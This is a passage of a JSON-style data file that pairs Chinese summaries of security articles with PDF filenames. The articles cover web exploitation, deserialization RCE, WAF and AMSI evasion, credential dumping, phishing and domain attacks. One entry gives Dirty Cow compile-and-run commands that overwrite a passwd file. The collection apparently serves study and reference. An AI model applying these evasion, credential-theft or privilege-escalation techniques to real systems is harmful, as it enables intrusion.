        "page_content": "本文档详细介绍了缓存投毒的原理、发现和利用方法，并通过多个实验示例展示了如何利用缓存投毒来攻击网站，包括资源的危险导入、Cookie 导致的 XSS、多个 Header 导致的缓存投毒、内容不唯一的缓存键导致的缓存投毒、DOM 型漏洞以及多个缓存投毒之间的配合。",
        "FileName": "7696-对缓存投毒的学习总结.pdf"
    },
    {
        "page_content": "文档主题：浅入深出谭谈HTTP响应拆分（CRLF Injection）攻击（上）\n文档内容：\nCRLF Injection 最⼤的⽤处便是任意插⼊恶意的 HTTP 头，甚⾄直接在原始请求中构造⼀个新的 HTTP 请求，像这样的功能如果与 SSRF 漏洞相结合那对 SSRF 来说岂不是如⻁添翼？\n下⾯我们将对 CRLF Injection 漏洞的概念进⾏简单的介绍，并对 PHP 、 Python 和 NodeJS 中的存在的 CRLF Injection 进 ⾏详细的讲解，然后对 CRLF Injection 在 SSRF 中攻击内⽹应⽤做了简单的研究与分析，最后给出了⼏个 CTF 中的实战例题。",
        "FileName": "9707-浅入深出谭谈 HTTP 响应拆分（CRLF Injection）攻击（上）.pdf"
    },
    {
        "page_content": "文档探讨了 AST Injection 漏洞，该漏洞存在于使用模版引擎（如 ejs、pug、handlebars）的 Web 应用程序中。攻击者可以通过向语法树注入恶意代码来利用此漏洞，从而导致远程代码执行。文档分析了 AST Injection 的原理，并提供了利用原型链污染和语法树处理过程中的漏洞来实现 RCE 的示例。",
        "FileName": "12635-一文带你理解AST Injection.pdf"
    },
    {
        "page_content": "本文分析了 weevely webshell 的构成，从中学习思路制作免杀脚本，实现冰蝎/蚁剑免杀。通过对 weevely webshell 代码的分析，作者总结了其生成规律和重要部分，并提出了改进思路。此外，文章还提供了冰蝎和蚁剑的默认 shell 查杀结果，以及改进后的免杀脚本。",
        "FileName": "11246-weevely的webshell分析以及冰蝎蚁剑免杀-PHP版.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP5.0.x 反序列化利用链\n\n**内容：** 该文档详细分析了 ThinkPHP5.0.x 中的反序列化漏洞，利用该漏洞可以触发任意类的 __toString 方法，进而通过 think\\console\\Output 类的 __call 方法调用 think\\cache\\driver\\File:set() 方法写文件，最终生成一句话木马。",
        "FileName": "7082-ThinkPHP5.0.x反序列化利用链.pdf"
    },
    {
        "page_content": "本文档介绍了 Web 应用程序防火墙 (WAF) 的工作原理、分类和绕过技术。WAF 是一种部署在 Web 应用程序之前，用于扫描和过滤用户请求，防止恶意攻击的网络安全设备。它通过预处理、规则检测、处理模块和日志记录四个步骤来处理请求，并根据不同的检测结果采取不同的安全防御措施。WAF 可分为硬件型、云 WAF、软件型和自定义 WAF，绕过技术包括大小写绕过、URL 编码技术、Unicode 技术、HTML 编码技术、注释技术、通配符混淆技术、宽字节、00 截断绕过、溢出绕过、协议未覆盖绕过、Cookie/X-Forwarded-For 注入绕过、利用 pipline 绕过和分区块传输绕过。",
        "FileName": "12684-从了解WAF到WAF的绕过.pdf"
    },
    {
        "page_content": "该文档介绍了如何制作包含恶意 JavaScript 代码的 PDF 文件，该代码可以在上传到支持 PDF 上传的网站时执行，从而导致跨站点脚本 (XSS) 漏洞。文档提供了两种制作此类 PDF 文件的方法：使用 Adobe Acrobat DC 或使用 Python PyPDF2 库。通过执行这些步骤，攻击者可以创建恶意 PDF 文件，当受害者打开或上传这些文件时，可以利用 XSS 漏洞窃取敏感信息或控制受害者的浏览器。",
        "FileName": "12467-xss pdf制作.pdf"
    },
    {
        "page_content": "该文档探讨了在 Windows 系统中抓取明文密码的两种方法：通过修改注册表注入 SSP（安全支持提供程序）DLL，或通过内联 Hook PasswordChangeNotify API。第一种方法需要修改注册表和放置 DLL，但重启后仍然有效；第二种方法不需要修改注册表或放置 DLL，但重启后会失效。文档还提供了使用反射加载 DLL 的方法，该方法可以将 DLL 注入到 lsass 进程中，从而抓取明文密码。",
        "FileName": "10734-关于抓取明文密码的探究.pdf"
    },
    {
        "page_content": "本文档介绍了甲方利用开源工具进行钓鱼演练的流程和方法，包括演练准备、钓鱼方式选择、实施过程和培训等方面。该演练旨在提高员工的安全意识，识别和应对钓鱼攻击，并通过数据分析和培训来加强安全防御能力。",
        "FileName": "10878-甲方利用开源工具进行钓鱼演练.pdf"
    },
    {
        "page_content": "**主题：** Apache Struts2 s2-057 远程代码执行漏洞分析\n\n**内容：** 该漏洞是由 struts.mapper.alwaysSelectFullNamespace 设置为 true 且 package 标签页和 result 的 param 标签页的 namespace 值缺失或使用通配符造成的。这会导致 namespace 被控制，最终导致远程代码执行。该漏洞影响 Apache Struts 2.3 - 2.3.34 和 2.5 - 2.5.16 版本。",
        "FileName": "9260-Struts2 s2-057远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档总结了 CVE-2020-0796 漏洞，该漏洞影响 SMB 协议，允许攻击者在目标系统上执行任意代码。该漏洞是由 SMB2 压缩功能中的一个整数溢出引起的，该溢出导致攻击者可以控制解压缓冲区的大小。通过构造一个精心设计的压缩包，攻击者可以触发整数溢出，并覆盖 SMB 服务器上的任意内存位置。这允许攻击者执行任意代码，从而获得对目标系统的完全控制。",
        "FileName": "9029-SMB协议漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了如何将 PowerShell 与 Meterpreter 有效负载集成，以进行内网渗透。通过加载 PowerShell 扩展，攻击者可以访问四个与 PowerShell 相关的命令，包括执行 PowerShell 语句、导入本地脚本、启动交互式 PowerShell 外壳和执行 PowerShell 会话。本文演示了如何使用这些命令进行 ARP 枚举、TCP 端口扫描和 SMB 共享枚举。此外，本文还介绍了 Nishang 框架，这是一个基于 PowerShell 的渗透测试和后渗透框架，包含了各种有用的工具和模块，可以帮助攻击者执行多种内网渗透和后渗透任务。",
        "FileName": "12289-记一次powershell在内网中的分析与利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何编写一个 Burp 插件，以自动化加密和签名接口请求，该插件利用了 FastJSON 漏洞和 MySQL 伪造服务器，并讨论了在测试过程中遇到的 Content-Type 问题。",
        "FileName": "10604-记某次接口加密测试.pdf"
    },
    {
        "page_content": "**主题：** Zoho ManageEngine Desktop Central 中的反序列化远程代码执行 (RCE) 漏洞 (CVE-2020-10189)\n\n**内容：** 该漏洞允许攻击者通过上传恶意序列化文件并触发反序列化过程，在受影响的系统上执行任意代码。该漏洞影响 Zoho ManageEngine Desktop Central 版本 10.0.474 及更早版本，已在版本 10.0.515 中修复。",
        "FileName": "7439-CVE-2020-10189 Zoho ManageEngine反序列化RCE.pdf"
    },
    {
        "page_content": "**文档主题：** CVE-2016-5195 漏洞分析与复现\n\n**文档内容：**\n\n该漏洞是 Linux 内核中一个名为 Dirty Cow 的漏洞，它允许非特权用户修改只读文件。该漏洞是由内核在处理页面故障时分配新页面时未正确清除 dirty 位引起的。这允许攻击者将只读内存映射到用户空间，然后修改该内存，从而修改只读文件。\n\n**漏洞复现：**\n\n1. 编译漏洞脚本：\n```\ngcc ./dirty.c -static -o dirty -lpthread -lcrypt\n```\n\n2. 运行脚本，为新用户设置新密码：\n```\n./dirty ./vuln_env/files/passwd xmzyshypnc 123456\n```\n\n3. 检查密码是否已更改：\n```\ncat ./vuln_env/files/passwd\n```\n\n**漏洞分析：**\n\n该漏洞的触发原理如下：\n\n1. 我们的目标是修改一个只读文件，这样就可以修改一些只有 root 可写的特权文件，比如 /etc/passwd。\n2. 漏洞产生产生的场景如下。我们使用 write 系统调用向 /proc/self/mem 写入内容，内核会调⽤ get_user_pages 函数，这个函数内部调⽤ follow_page_mask 来寻找对应的页表项。\n3. 第一次获取页表项会因为缺页失败 ( 请求调度的机制 ) 。\n4. get_user_pages 第三次调⽤ follow_page_mask 的时候不再要求页表项指向的内存映射有可写权限，因此可以直接成功获取，获取之后就可以对只读内存进⾏强制写⼊操作。\n5. 上述实现是没有问题的，对 /proc/self/mem 的写⼊本来就是⽆视权限的。在写⼊操作中：\n   - 如果虚拟内存是 VM_SHARE 的映射，那么 mmap 能够映射成功 ( 注意映射有写权限 ) 的条件就是进程对该⽂件有可写权限，因此写⼊不算越权\n   - 如果虚拟内存是 VM_PRIVATE 的映射，那么会 COW 创建⼀个可写副本进⾏写⼊操作，所有的 update 不 会更新到原⽂件中。\n6. 但是上述第⼆次失败之后如果我们⽤⼀个线程调⽤ madvise(addr,len,MADV_DONTNEED), 其中 addr-addr+len 是⼀个只读⽂件的 VM_PRIVATE 的只读内存映射，那映射的页表项就会变为空。这时候如果第三次调⽤ follow_page_mask 来获取页表项，就不会⽤之前 COW 的页框了 ( 页表项为空了 ) ，⽽是直接去找原来只读的那个内存⻚，现在⼜不要求可写，因此不会再 COW ，直接写这个物理⻚就会导致修改了只读⽂件。\n\n**漏洞修复：**\n\n该漏洞已在 Linux 内核 4.8.13 中修复。修复方法是在分配新页面时正确清除 dirty 位。",
        "FileName": "7561-CVE-2016-5195漏洞分析与复现.pdf"
    },
    {
        "page_content": "本文分析了CVE-2021-26411漏洞，该漏洞是Microsoft MSHTML远程代码执行漏洞，攻击者可通过制作恶意的ActiveX控件供托管浏览器呈现引擎的Microsoft Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码。该漏洞影响范围广泛，包括Windows 7、8.1、10、Server 2008、2012、2016、2019等系统。本文还介绍了CVE-2021-40444漏洞，该漏洞是IE浏览器代码执行漏洞，影响范围包括启用了ActiveX控件和插件的Internet Explorer浏览器以及可以直接利用Office（Word、Excel、PowerPoint）的系统。本文提供了漏洞利用条件、复现步骤、POC分析和MSF上线方法，并对漏洞进行了实战利用。",
        "FileName": "10679-由一次勒索病毒应急响应浅谈hw中IE钓鱼的可能性.pdf"
    },
    {
        "page_content": "**主题：** Apache Airflow Google Cloud SQL Provider 中的远程命令执行漏洞 (CVE-2023-25691)\n\n**内容：** 该漏洞允许攻击者通过修改连接配置信息，在使用 CloudSQLExecuteQueryOperator 运算符的 DAG 运行时执行恶意命令。攻击者可以利用 Google Cloud Storage 的公共访问域名来存储恶意可执行文件，并通过修改 sql_proxy_version 参数来下载和执行该文件。",
        "FileName": "12496-CVE-2023-25691 Apache Airflow Google Cloud Sql Provider  远程命令执行.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Nginx_lua 100 参数绕过原理，通过分析 Nginx_lua 中 ngx.req.get_uri_args() 函数的实现，发现其默认只记录 100 个参数，超过 100 个参数时不会记录，从而达到绕过参数限制的目的。",
        "FileName": "9390-Nginx_lua 100参数绕过原理详解.pdf"
    },
    {
        "page_content": "该文档主要介绍了对 jpress V4.2 框架的代码审计，重点分析了模板渲染漏洞和前台任意文件上传漏洞。通过构造恶意评论和上传多个文件，攻击者可以利用这些漏洞在目标系统上执行任意命令和上传恶意文件。文档还提供了漏洞修复建议，包括转义字符和过滤恶意文件。",
        "FileName": "11832-jpress代码审计分享.pdf"
    },
    {
        "page_content": "该文档分析了 APISIX 的安全评估，重点关注网关和仪表盘系统。它评估了 API 的身份验证和授权，并发现了插件中一个安全问题（CVE-2022-25757），该问题涉及 request-validation 插件在解析具有重复键值的 JSON 时与上游服务存在差异，从而可能绕过限制。",
        "FileName": "11465-APISIX 安全评估.pdf"
    },
    {
        "page_content": "该文档详细介绍了在 bWAPP 平台上进行 SQL 注入攻击的步骤和技术，涵盖了 GET/Search、GET/Select、POST/Search、POST/Select、AJAX/JSON/jQuery、Login Form/Hero、Login Form/User、SQLite、Drupal SQL Injection (Drupageddon)、SQL Injection - Stored (Blog)、SQL Injection - Stored (User-Agent)、SQL Injection - Stored (XML)、SQL Injection - Blind - Boolean-Based 和 SQL Injection - Blind - Time-Based 等多种注入类型。",
        "FileName": "12069-3.bWAPP SQL注入篇.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 ThinkPHP6.0.12LTS 框架中的反序列化漏洞来实现 getshell，通过分析框架的源码，确定了反序列化入口点和可控的适配器，并构建了 POC 链，最终通过反序列化恶意数据实现了远程代码执行。",
        "FileName": "11531-ThinkPHP6.0.12LTS反序列化（getshell的poc链挖掘）.pdf"
    },
    {
        "page_content": "该文档分析了 SystemedMiner 挖矿木马的感染过程和处置方法，该木马通过 SSH 暴力破解、SSH 免密登录利用、Hadoop Yarn 未授权访问漏洞和自动化运维工具内网扩散，并清除主机上的其他挖矿木马以达到资源独占的目的。",
        "FileName": "11297-记录一次挖矿木马的分析与处置过程.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Shiro 框架中的两个漏洞（CVE-2020-11989 和 CVE-2020-13933），这些漏洞允许攻击者绕过身份验证和授权机制，从而访问未经授权的资源。文档详细介绍了漏洞的原理、利用方法和修复措施，并比较了 Shiro 不同版本中 URL 处理的差异。",
        "FileName": "8223-shiro CVE-2020-11989&CVE-2020-13933复现分析.pdf"
    },
    {
        "page_content": "该漏洞存在于名为 \"hedwig.cgi\" 的 CGI 脚本中，未认证攻击者通过调⽤这个 CGI 脚本传递⼀个  чрез⻓的 cookie 值，使得程序 栈溢出，从⽽获得路由器的远程控制权限。",
        "FileName": "7835-D-Link DIR815路由器缓冲区溢出漏洞再分析.pdf"
    },
    {
        "page_content": "本文探讨了二进制软件成分分析 (SCA) 在数字供应链安全中的应用。二进制 SCA 通过分析二进制软件来检测潜在风险，包括开源软件风险、安全配置风险、信息泄露风险和安全编译选项风险。它与源代码 SCA 互补，在不同的阶段和场景下具有各自的优势。二进制 SCA 技术包括静态分析和动态分析，并利用多维特征提取和相似度算法来识别二进制文件中的开源组件。它在开发安全检测和供应链安全检测中具有广泛的应用，帮助企业管理软件组件，提高软件安全性，并建立有效的数字供应链安全治理体系。",
        "FileName": "12722-SCA技术进阶系列（三）：浅谈二进制SCA在数字供应链安全体系中的应用.pdf"
    },
    {
        "page_content": "该文档记录了一次曲折的渗透测试，其中渗透者通过收集子域名、利用逻辑漏洞、修改数据包、下载数据库备份、获取电子邮件配置和利用忘记密码功能，最终获得了管理员权限并成功获取了一句话木马。",
        "FileName": "11049-记一次相当曲折的渗透.pdf"
    },
    {
        "page_content": "该文档介绍了作者构思和实现漏洞验证框架的思路和过程，该框架旨在提供跨平台、可视化、高并发、资源占用小的漏洞验证功能，并支持标准化的 POC 格式、可视化编辑和批量目标检测。",
        "FileName": "9701-谈谈漏洞验证框架的构思与实现（一）.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Shiro 框架的组成、认证和授权流程，并提供了 Springboot 集成 Shiro 的示例代码。文档还分析了 Shiro 中的 CVE-2020-1957 权限绕过漏洞，该漏洞允许攻击者通过在请求路径中包含分号来绕过权限检查。",
        "FileName": "12643-Shiro从入门到权限绕过漏洞.pdf"
    },
    {
        "page_content": "本文档探讨了 XMLHttpRequest (XHR) 在网络安全中的应用，重点介绍了两种利用方式：利用 XHR 读取本地文件和利用 XSS 结合 XHR 实现命令执行。通过分析 Hackthebox 靶场中的示例，文档展示了如何利用 XHR 绕过限制，获取敏感信息或执行恶意操作。",
        "FileName": "7473-从两道靶场题目看XHR.pdf"
    },
    {
        "page_content": "CodeQL 是一种代码分析引擎，可用于辅助安全人员挖掘漏洞或直接进行漏洞挖掘，从而节省重复操作的时间。它支持多种编程语言，包括 Python、Java、JavaScript、C/C++、C# 和 Go，并提供了一个查询格式，允许用户定义变量、声明限制条件和选择要输出的数据。通过使用 CodeQL，安全人员可以锁定他们想要看到的函数调用，并结合判断条件来查找目标代码中的特定模式。",
        "FileName": "7657-Codeql 入门教程.pdf"
    },
    {
        "page_content": "该文档介绍了绕过 Duo RDP 双因素身份验证的几种方法，包括利用目标机器的 Shell 命令行、Metasploit 模块、Ettercap 等工具的 ARP+DNS 欺骗功能。这些方法可以绕过 Duo 的双因素身份验证，允许未经授权的用户访问受保护的系统。",
        "FileName": "7880-Duo RDP双因素身份验证防护绕过.pdf"
    },
    {
        "page_content": "本文分析了 Windows API Hook 的原理和应用，包括使用 inline hook 技术实现 MessageBoxA 的 hook，以及探讨 32 位和 64 位环境下的区别。此外，还介绍了如何检测 EDR 全局 hook 并使用 syscall 直接绕过 hook。最后，文章提出了躲避 AV/EDR hook 的一些想法，包括使用 SysWhispers 工具生成 syscall 汇编代码和头文件，并将其集成到加载器中。",
        "FileName": "9166-浅析Window API Hook的原理与应用.pdf"
    },
    {
        "page_content": "该文档主要介绍了AFL（American Fuzzy Lop）的源码分析，重点关注了其fuzzer模块（afl-fuzz.c）中的关键函数。AFL是一个流行的模糊测试工具，用于发现软件中的安全漏洞。该文档详细解释了这些关键函数的实现原理和流程，包括初始化配置、fuzz执行、变异策略和队列管理等方面。通过对这些函数的分析，可以深入理解AFL的工作机制和设计思想。",
        "FileName": "10316-AFL二三事——源码分析（下篇）.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Python 编写一个多线程 Web 指纹扫描器，名为 Fuckcms，该扫描器可以识别网站的服务器类型、语言、框架和 CMS。它使用 HTTP 请求和指纹库来识别这些属性，并提供有关扫描结果的详细输出。",
        "FileName": "10634-记一次安全工具的初次编写 Fuckcms--一个用python实现的多线程web指纹扫描器.pdf"
    },
    {
        "page_content": "该文档分析了 Tomcat 作为中间件的实现原理，重点关注其作为 Web 容器的功能。它描述了 Tomcat 的组件结构，包括服务器、服务、连接器和容器，以及它们如何协同工作以处理 HTTP 请求。文档还探讨了 Tomcat 的类加载机制、初始化过程和 Web 应用程序类加载器。最后，它提供了使用调试器分析 Tomcat 启动过程的示例，并强调了在配置文件中设置 JNDI 注射的潜在安全风险。",
        "FileName": "11213-tomcat 流程及组件浅析.pdf"
    },
    {
        "page_content": "该文档描述了作者在挖掘逻辑漏洞时发现的越权漏洞。作者通过分析预约系统的抓包数据，发现修改预约信息时参数不加密，而提交时参数加密。作者利用修改处不加密的特点，修改appid参数，成功将id参数加密，从而批量遍历加密字典，越权查看他人预约信息。",
        "FileName": "9189-记一次逻辑漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档探讨了跨站请求伪造 (CSRF) 漏洞，这是一种攻击，其中攻击者利用受害者的 Cookie 向服务器发送伪造请求。CSRF 攻击的原理是利用受害者对受信任网站的信任，并通过伪装来自受信任用户的请求来利用受信任的网站。文档介绍了 CSRF 漏洞的类型、攻击流程和防御措施，并提供了 DVWA 靶场练习的示例。",
        "FileName": "7297-从一些常见场景到CSRF漏洞利用.pdf"
    },
    {
        "page_content": "本文探讨了 HTTP 请求走私的成因和利用方法，重点关注了 Content-Length 和 Transfer-Encoding 请求头在不同服务器实现中的差异如何导致请求边界划分不一致，从而实现走私攻击。文中还介绍了利用走私获取其他用户请求内容、绕过安全限制等攻击方式，并讨论了禁用 TCP 连接重用、使用 HTTP/2 协议等防御措施。",
        "FileName": "7501-浅谈HTTP请求走私.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 代码审计中 PHP_SELF 变量的利用，重点关注了 ImpressCMS 中的一个 SQL 注入漏洞。该漏洞允许攻击者通过构造恶意 URL 来执行任意 SQL 查询，从而导致敏感信息泄露或系统控制权被接管。文档还讨论了 PHP_SELF 和 REQUEST_URI 变量的其他潜在安全问题，例如反射型 XSS。",
        "FileName": "7621-PHP代码审计之关于PHP_SELF的简单利用.pdf"
    },
    {
        "page_content": "该文档描述了针对某凌 OA（EKP）办公系统的一次渗透测试，该系统存在任意文件读取和 SSRF+JNDI 远程命令执行安全漏洞。攻击者可利用任意文件读取漏洞读取管理员密码配置文件，获取加密口令后解密登录系统配置管理后台，再利用 SSRF 漏洞进行远程命令执行操作。",
        "FileName": "9950-记一次密码读取+SSRF渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons Collections 库中的 TransformedMap 和 LazyMap 类，这些类可用于在 Java 反序列化过程中执行任意代码。文档详细介绍了这些类的功能、漏洞触发点以及如何利用它们来构造恶意 POC。",
        "FileName": "10357-通俗易懂的Commons Collection 1分析.pdf"
    },
    {
        "page_content": "该文档介绍了利用 Microsoft Office 应用程序（如 Excel、Word 和 CHM）中的宏、DDE 和嵌入式 HTML 代码来执行恶意操作的技术。这些技术包括在受保护视图中打开文件、使用宏自动打开命令提示符、在 Word 中使用 DDE 执行系统命令、创建嵌入链接文件以诱导用户执行命令、修改嵌入式视频代码以注入恶意 JS 代码、利用模板文件注入宏指令以及使用 RLO Unicode 控制字符迷惑文件。",
        "FileName": "10339-常见钓鱼招式.pdf"
    },
    {
        "page_content": "本文分析了 Jackson 反序列化利用链的不稳定性，并通过使用 Spring AOP 中的 JdkDynamicAopProxy 作为 gadget，修改了 Jackson 链，将以随机顺序触发 TemplatesImpl 上的所有 getter 转换为只触发 getOutputProperties，避免了 Jackson 链的不稳定性，同时，Jackson 链依然可以在 SpringBoot 环境下直接使用。",
        "FileName": "12846-从JSON1链中学习处理JACKSON链的不稳定性.pdf"
    },
    {
        "page_content": "该文档探讨了绕过 Web 应用程序防火墙 (WAF) 的技术，重点介绍了使用 JavaScript 生成字符和利用对象展开、数组转换和正则表达式等技术来绕过 WAF 限制。它还讨论了绕过 Cloudflare 保护的网站的特定方法，并提供了示例代码和可能的解决方案。",
        "FileName": "8023-JS 生成字符及bypass waf初探.pdf"
    },
    {
        "page_content": "文档探讨了对抗 Antimalware Scan Interface (AMSI) 的多种方法，包括 DLL 劫持、降低 PowerShell 版本、混淆和利用反射将内存中 AmsiScanBuffer 方法的检测长度置为 0。这些方法旨在绕过 AMSI 的恶意软件检测功能，从而允许执行任意 PowerShell 脚本。",
        "FileName": "10437-几种对抗AMSI的方式.pdf"
    },
    {
        "page_content": "该文档介绍了如何跨平台重构 CobaltStrike 的 Beacon 并使其行为对主流杀毒软件免杀。它涵盖了重构过程中的技术考虑、实现细节以及免杀策略，包括命令执行、反射型 DLL 注入、令牌窃取和字符集转换。",
        "FileName": "11839-跨平台重构CobaltStrike的Beacon并使行为对主流杀软免杀.pdf"
    },
    {
        "page_content": "CVE-2020-0605 漏洞影响 .NET 处理 XPS 文件，允许攻击者通过恶意 XPS 文件执行任意代码。该漏洞源于 .NET 中基于 XAML 的序列化处理，可通过修改 XPS 文件中的 XML 内容来利用，影响 .NET 中处理 XPS 文件的各种场景。受影响的 .NET 内部类包括 System.Windows.Documents.XpsValidatingLoader，其 Load() 和 Validate() 方法在处理恶意 XAML 指令时可能导致代码执行。攻击者可以使用基于 XAML 的小工具，例如 FixedDocument/FixedDocumentSequence + xaml 引用或 FixedDocument/FixedDocumentSequence 类中的 Resources 属性，来触发该漏洞。",
        "FileName": "8245-CVE-2020-0605：.NET处理XPS文件时的命令执行.pdf"
    },
    {
        "page_content": "该文档记录了一次实战渗透测试，通过信息收集和尝试各种攻击点，渗透者成功进入学校内网，发现了弱口令漏洞和未授权访问，并最终获得了对监控系统和人脸识别系统的控制权。文档强调了尝试的重要性，并指出学校内网的防护意识较低，存在大量漏洞。",
        "FileName": "8266-实战渗透—信息收集通往内网.pdf"
    },
    {
        "page_content": "该文档描述了利用弱口令和参数修改等技术，成功获取网站后台权限并上传恶意文件，最终获得网站控制权的过程。文档重点介绍了利用弱口令登录、修改返回数据包、寻找文件上传漏洞、利用 SQL 注入和绕过密码验证等技术，展示了黑客攻击网站的常见手法。",
        "FileName": "10664-从某站点的弱口令泄露到通用GetShell.pdf"
    },
    {
        "page_content": "该文档介绍了无参数远程代码执行 (RCE) 的概念和实现方法，包括利用 HTTP 头部、get_defined_vars() 函数、getallheaders() 函数、getenv() 函数和 scandir() 函数等技术，并提供了多个示例和利用场景。",
        "FileName": "10212-谭谈关于无参数RCE.pdf"
    },
    {
        "page_content": "该文档详细介绍了第五届对抗赛的靶场环境设计，包括漏洞环境的部署和得分规则的修改，重点考察漏洞利用而非漏洞验证。靶场环境分为 DMZ 区、办公网和域环境，涉及 Nginx 解析漏洞、常规 RCE 漏洞、JNDI 注入、SMB 泄露、log4j 漏洞、Fastjson 漏洞、域内横向移动和域管权限获取等技术。",
        "FileName": "11158-XX第五届对抗赛.pdf"
    },
    {
        "page_content": "该文档分析了利用不安全的 JSONP 调用绕过单点登录 (SSO) 实现账户接管的漏洞。SSO 机制允许用户使用一个凭证登录多个网站，但由于 Kolesa 网站使用不安全的 JSONP 调用，攻击者可以窃取身份验证令牌并接管任意账户。",
        "FileName": "8350-利用不安全的JSONP绕过SSO实现账户接管（分析+实践）.pdf"
    },
    {
        "page_content": "该文档探讨了智能合约中拒绝服务 (DoS) 攻击的类型和防御措施，包括未设定 gas 费率的外部调用、依赖外部调用进展、owner 错误操作、数组或映射过长、逻辑设计错误和依赖库问题。",
        "FileName": "9871-智能合约拒绝服务攻击.pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 Tomcat 反序列化注入实现内存 Webshell 的技术，通过修改 WRAP_SAME_OBJECT 变量的值，将请求和响应信息存储在 ThreadLocal 变量中，从而绕过文件落地，实现无文件内存 Webshell 的注入。",
        "FileName": "12494-Tomcat反序列化注入回显内存马.pdf"
    },
    {
        "page_content": "该文档分析了 baijiacmsV4 代码中的多个漏洞，包括任意文件删除、任意路径删除和后台 RCE。这些漏洞存在于 system/eshop/core/mobile/util/uploader.php、system/manager/class/web/database.php、system/public/class/web/file.php 和 system/weixin/class/web/setting.php 文件中。攻击者可以利用这些漏洞删除任意文件、删除任意路径或在服务器上执行任意命令。",
        "FileName": "10489-baijiacmsV4代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2016-3510 漏洞，该漏洞是对 CVE-2015-4852 漏洞修复的绕过，攻击者可以通过该漏洞实现远程命令执行。文档详细介绍了漏洞原理、修复方法以及绕过方式，并提供了 EXP 代码。",
        "FileName": "8529-CVE-2016-3510Weblogic反序列化分析.pdf"
    },
    {
        "page_content": "该文档的主题是 CVE-2019-18634 漏洞复现，内容包括漏洞复现步骤和附件下载链接。",
        "FileName": "7619-1.pdf"
    },
    {
        "page_content": "Apache OFBiz RMI 反序列化远程代码执行漏洞（CVE-2021-26295）允许攻击者通过 SOAP 请求发送恶意序列化数据，利用 SafeObjectInputStream 类的反序列化漏洞，触发 RMI 远程代码执行，从而控制受影响的系统。",
        "FileName": "9345-Apache OFBiz RMI反序列化远程代码执行漏洞（CVE-2021-26295）.pdf"
    },
    {
        "page_content": "该文档探讨了如何利用 PHP 伪协议过滤器绕过 file_put_contents() 函数中的死亡或杂糅代码，并提供了多种利用方法，包括 base64 编码、过滤器组合拳、.htaccess 预包含、rot13 编码、iconv 编码转换以及注释杂糅代码。",
        "FileName": "8163-file_put_content和死亡·杂糅代码之缘.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，从弱口令登录开始，通过信息泄露漏洞爆破出用户密码，再利用历史漏洞进入 Docker 容器，最后通过 CVE-2019-5736 漏洞逃逸出 Docker，成功获取目标主机 shell。",
        "FileName": "8699-偶然的一次渗透从弱口令-docker逃逸.pdf"
    },
    {
        "page_content": "该文档介绍了绕过防火墙“网盾”的几种方法，包括文件名绕过、boundary绕过、畸形请求方法绕过和文件内容绕过。它提供了详细的步骤和示例代码，展示了如何使用这些方法绕过防火墙的限制，从而执行未经授权的操作。",
        "FileName": "11607-玄武盾的几种绕过姿势.pdf"
    },
    {
        "page_content": "这篇文档主要讨论了域信任和森林到森林信任横向移动的攻击技术，包括域信任攻击、子域到父域升级、跨森林攻击、非约束委派攻击、外部组和用户攻击、MSSQL 信任链接攻击以及 ACL 攻击。",
        "FileName": "12140-域渗透GOAD(Game Of Active Directory) v2（四）.pdf"
    },
    {
        "page_content": "该文档分析了 Thymeleaf SSTI 漏洞，包括模板引擎的概念、Thymeleaf 的优势、Thymeleaf 语法、文本外部化、变量表达式、片段表达式、视图解析过程、漏洞复现、漏洞原理、漏洞修复方法等内容。",
        "FileName": "10514-Thymeleaf SSTI漏洞分析.pdf"
    },
    {
        "page_content": "Apache Shiro 1.2.4 版本中 RememberMe 功能存在反序列化漏洞，攻击者可利用该漏洞通过 AES 加密 Cookie，触发反序列化漏洞完成任意代码执行。",
        "FileName": "7950-Shiro-1.2.4-RememberMe 反序列化踩坑深入分析.pdf"
    },
    {
        "page_content": "本文介绍了 SSH 协议及其安全测试，包括端⼝扫描、服务识别、密码暴⼒破解、获得 meterpreter 权限、配置 RSA 密钥连接、窃取 SSH 密钥、留下 SSH 密钥持久性后⻔以及 SSH 漏洞防御机制，如修改默认端⼝、加强⼝令强度、设置应⽤服务⽤户不可登录、基于 PAM 实现登录限制和及时升级 SSH 产品版本。",
        "FileName": "7954-SSH服务安全测试.pdf"
    },
    {
        "page_content": "该文档分析了 UEditor 编辑器中的任意文件上传漏洞，该漏洞允许攻击者通过绕过 ContentType 检查，上传任意文件。漏洞存在于 CrawlerHandler 类中，该类在处理远程文件抓取时，会根据响应头中的 ContentType 判断文件类型，如果 ContentType 不包含 \"image\"，则返回错误。攻击者可以通过将 ContentType 设置为 \"image/jpeg\"，绕过检查，上传任意文件。",
        "FileName": "8488-UEditor编辑器任意文件上传漏洞分析.pdf"
    },
    {
        "page_content": "该文档重点介绍了 Kerberos 协议在域内渗透中的应用，以及利用经典漏洞（如 MS14-068、CVE-2021-42287 和 CVE-2021-42278）在域环境中横向移动和提升权限的方法。它还讨论了服务主体名称 (SPN) 的概念，以及如何利用 SPN 来探测服务和发起 Kerberos 攻击。",
        "FileName": "10806-内网漫游之Kerberos协议利用加经典漏洞利用总结.pdf"
    },
    {
        "page_content": "该文档分析了 WebLogic CVE-2020-14756 漏洞，该漏洞利用了 coherence 包中的反序列化接口，允许攻击者通过加载不受黑名单限制的类来执行任意代码。漏洞利用涉及使用 com.tangosol.coherence.rest.util.extractor.MvelExtractor 类，该类实现了 ExternalizableLite 接口，并通过触发 extract 方法来执行任意代码。",
        "FileName": "9163-WebLogic CVE-2020-14756 T3IIOP 反序列化RCE.pdf"
    },
    {
